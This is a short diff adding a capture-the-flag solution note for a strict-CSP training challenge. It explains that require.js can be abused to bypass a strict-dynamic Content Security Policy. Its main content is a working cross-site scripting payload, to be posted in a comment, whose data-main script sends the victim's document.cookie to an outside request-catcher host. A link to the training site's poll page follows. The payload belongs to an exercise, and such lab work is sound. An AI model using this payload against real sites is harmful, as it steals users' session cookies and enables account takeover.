@@ -1,0 +1,5 @@
+SOLUTION: using require.js that allows to bypass strict-dynamic policy. The script to get the flag is equal to the one of csp challenge.
+In a comment we write:
+<script data-main='data:1,document.location="https://endcrsx6l2bfr.x.pipedream.net/?" + document.cookie' src='require.js'></script>
+
+https://strict-csp.training.jinblack.it/poll/3dc1d33c80414e95afeda11470fe30e6
